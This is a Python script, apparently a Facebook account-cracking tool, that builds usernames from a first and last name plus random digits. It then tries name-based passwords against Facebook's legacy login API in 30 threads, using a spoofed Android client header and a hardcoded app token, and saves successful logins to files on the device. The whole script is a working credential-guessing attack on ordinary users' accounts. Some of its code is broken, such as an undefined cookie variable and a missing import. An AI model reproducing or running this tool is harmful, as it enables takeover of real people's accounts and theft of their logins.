import os
from os import system as clr
import random 
import uuid
import httpx
import json
import sys
import string
from concurrent.futures import ThreadPoolExecutor as ted


e = "\033[0m"
r = "\033[1;31m"
g = "\033[1;32m"
y = "\033[1;33m"
b = "\033[1;34m"
p = "\033[1;35m"
c = "\033[1;36m"
w = "\033[1;37m"


logo="""\033[1;37m
  .o88b. d8888b.  .d8b.   .o88b. db   dD      
 d8P  Y8 88  `8D d8' `8b d8P  Y8 88 ,8P'      
 8P      88oobY' 88ooo88 8P      88,8P        
 8b      88`8b   88~~~88 8b      88`8b        
 Y8b  d8 88 `88. 88   88 Y8b  d8 88 `88.      
  `Y88P' 88   YD YP   YP  `Y88P' YP   YD
------------------------------------------
 Author : MR FIAZ NIAZI
 Facebook : MUHAMMAD FIAZ KHAN
 GitHub  : https://github.com/MR-F1AZ-404
------------------------------------------"""

def linex():
	print(f'------------------------------------------')

def main():
	os.system("clear")
	print(logo)
	print("[1] Start Cloning  ")
	print("[0] Back")
	linex()
	select()

def select():
	select = input('[+] Choose Option: \x1b[1;97m')
	if select == '':
		print("\x1b[1;91mFill in correctly")
		main()
	elif select == '1':
		crack()
	elif select == '0':
		exit()
	else:
		print ('\x1b[1;91m[!] Please select a valid option')
		time.sleep(2)

def crack():
    user=[]
    os.system('clear')
    print(logo)
    kode = input(' [!] First Name : ')
    linex()
    kodex = input(' [!] Last Name :  ')
    linex()
    Domain = '.'
    try:
        limit=int(input('[?] Put Crack Limit : '))
        linex()
        os.system('clear')
        print(logo)
    except ValueError:
        limit=5000
    for nmbr in range(limit):
        nmp="".join(random.choice(string.digits) for _ in range(1,4))
        user.append(nmp)
    with ted(max_workers=30) as yaari:
        tl=str(len(user))
        print(' Total ids:\x1b[32m '+tl)
        print(f"\033[1;97m Selected Name:\x1b[32m {kode} {kodex}")
        print('\033[1;37m Use fligh mode for speed up')
        linex()
        for digitx in user:
            ids=kode+Domain+kodex+digitx
            pwx = [kode,kodex,kode+kodex,kode+'123',kode+'1234',kode+'12345',kodex+'123',kodex+'1234',kodex+'12345']
            yaari.submit(rcrack,ids,pwx)
    linex()
    print('Crack process has been completed')
    print('Ids saved in ok.txt,cp.txt')
    main()
oks=[]
cps=[]
loop=0

def rcrack(ids,pwx):
    global oks
    global cps
    global loop
    try:
        for pas in pwx:
            sys.stdout.write('\r\33[1;37m[FIAZ-XD] %s|OK:%s  \r'%(loop,len(oks)))
            sys.stdout.flush()
            adid=str(uuid.uuid4())
            device_id=str(uuid.uuid4())
            datax={'adid': adid,
           'format': 'json',
           'device_id': device_id,
           'email': ids,
           'password': pas, 
           'generate_analytics_claims': '1',
           'credentials_type': 'password',
           'source': 'login', 
           'error_detail_type': 'button_with_disabled',
           'enroll_misauth': 'false', 
           'generate_session_cookies': '1',
           'generate_machine_id': '1',
           'meta_inf_fbmeta': '', 
           'currently_logged_in_userid': '0',
            'fb_api_req_friendly_name': 'authenticate'}
            header={'User-Agent': '[FBAN/FB4A;FBAV/39.0.0.2424;FBBV/4475870;[FBAN/FB4A;FBAV/226.0.0.49.120;FBBV/159526646;FBDM/{density=1.5,width=720,height=1244};FBLC/en_GB;FBRV/0;FBCR/Telenor PK;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J100H;FBSV/4.4.4;FBOP/1;FBCA/armeabi-v7a:armeabi;]', 'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*',
            'Connection': 'keep-alive', 
            'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 
            'X-FB-Friendly-Name': 'authenticate', 
            'X-FB-Connection-Bandwidth': '21435', 
            'X-FB-Net-HNI': '35793',
            'X-FB-SIM-HNI': '37855', 
            'X-FB-Connection-Type': 'unknown', 
            'Content-Type': 'application/x-www-form-urlencoded', 
            'X-FB-HTTP-Engine': 'Liger'}
            url='https://api.facebook.com/method/auth.login'
            req=httpx.post(url,data=datax,headers=header).json()
            if 'session_key' in req:
                print('\033[1;32m [FIAZ-OK] '+ids+' | '+pas)
                print("\033[1;36mCOOKIE =\033[1;37m",cookie)
                open('/sdcard/ok.txt', 'a').write(ids+' | '+pas+'\n')
                oks.append(ids)
                break
            elif 'www.facebook.com' in req['error_msg']:
                print('\033[1;33m [FIAZ-CP] '+ids+' | '+pas)
                open('/sdcard/cptxt', 'a').write(ids+' | '+pas+'\n')
                cps.append(ids)
                break
            else:
                continue
        loop+=1
    except:
        pass
main()
